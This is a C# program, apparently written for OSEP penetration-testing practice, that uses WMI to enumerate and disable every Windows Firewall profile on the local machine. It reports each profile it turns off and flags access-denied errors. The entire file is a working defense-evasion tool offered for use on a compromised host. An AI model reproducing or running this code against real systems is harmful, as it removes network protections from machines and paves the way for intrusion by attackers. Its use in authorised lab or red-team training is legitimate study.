using System;
using System.Management;

namespace OSEP
{
    public class KillFirewall
    {
        public static void Main(string[] args)
        {
            Console.WriteLine("[*] OSEP Firewall Disarmer (C# - WMI Edition)");

            try
            {
                // Firewall profiles are in root\StandardCimv2
                ManagementScope scope = new ManagementScope(@"\\.\root\StandardCimv2");
                scope.Connect();

                ObjectQuery query = new ObjectQuery("SELECT * FROM MSFT_NetFirewallProfile");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);

                Console.WriteLine("[*] Enumerating and disabling profiles...");

                bool atLeastOneDisabled = false;
                foreach (ManagementObject profile in searcher.Get())
                {
                    string name = profile["Name"].ToString();
                    try
                    {
                        // 1 = Enabled, 2 = Disabled (Standard CIM values)
                        // In MSFT_NetFirewallProfile, Enabled is a uint16
                        // 1: Enabled, 2: Disabled
                        profile["Enabled"] = (ushort)2; 
                        profile.Put();
                        Console.WriteLine("[+] Disabled profile: {0}", name);
                        atLeastOneDisabled = true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] Failed to disable profile {0}: {1}", name, ex.Message);
                    }
                }

                if (atLeastOneDisabled)
                {
                    Console.WriteLine("[+] SUCCESS: Firewall profiles updated.");
                }
                else
                {
                    Console.WriteLine("[-] WARNING: No profiles were modified. Check permissions.");
                }
            }
            catch (ManagementException e)
            {
                if ((uint)e.ErrorCode == 0x80041003)
                    Console.WriteLine("[-] ERROR: Access Denied. Admin required.");
                else
                    Console.WriteLine("[-] WMI ERROR: {0}", e.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ERROR: {0}", ex.Message);
            }
        }
    }
}
